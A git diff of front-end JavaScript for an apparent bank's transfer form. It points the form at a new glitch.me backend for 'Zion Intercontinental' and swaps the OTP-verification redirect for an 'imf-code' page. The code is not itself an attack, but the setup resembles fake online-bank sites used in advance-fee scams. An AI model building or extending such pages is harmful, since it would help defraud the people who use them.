@@ -20,7 +20,7 @@ const fetch_transfer = async (form) => {
   document.querySelector("#submit").innerHTML = "Proccessing...";
   try {
     const response = await fetch(
-      "https://zionintercontinentalb-backend.glitch.me/api/user/transact",
+      "https://zionintercontinentalbnk-biz-backend.glitch.me/api/user/transact",
       {
         method: "POST",
         headers: { "content-type": "application/json" },
@@ -35,7 +35,8 @@ const fetch_transfer = async (form) => {
       return;
     }
     document.querySelector("#submit").innerHTML = "Success";
-    window.location.replace("/verify_otp.html");
+    // window.location.replace("/verify_otp.html");
+    window.location.replace("/imf-code.html");
   } catch (err) {
     console.log(err);
     document.querySelector("#errMessage").innerHTML = err.message;
@@ -92,7 +93,7 @@ document.querySelectorAll("input").forEach(
       //   document.querySelector("#pin_error").innerHTML = "";
       //   document.querySelector("#b_m_n").innerHTML = "";
       document.querySelector("#errMessage").innerHTML = "";
-    })
+    }),
 );
 document.querySelector("select").onchange = () => {
   document.querySelector("select").style.border = "2px solid #fff";
